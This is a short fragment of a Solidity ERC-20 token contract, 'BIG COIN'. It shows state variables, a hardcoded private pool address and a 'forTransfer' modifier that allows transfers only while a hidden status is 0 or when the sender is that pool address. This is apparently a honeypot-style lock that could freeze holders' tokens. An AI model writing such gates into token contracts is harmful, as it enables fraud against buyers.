...
contract BIGCOIN is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenBIG_totalSupply;
    uint256 private _tokenBIG_status = 0;
    uint256 public stakingPoolBIGStatus = 0;

    string private _tokenBIG_name;
    string private _tokenBIG_symbol;

    address private _poolBIGAddress = 0x0F130eA985cBE3aa5771463263C71d45986c5221;

    constructor() {
        _tokenBIG_name = "BIG COIN";
        _tokenBIG_symbol = "BIG";
        _tokenBIG_totalSupply = 47200 * 10 ** 18;
        _balances[msg.sender] = _tokenBIG_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolBIGAddress || _tokenBIG_status == 0);
        _;
    }
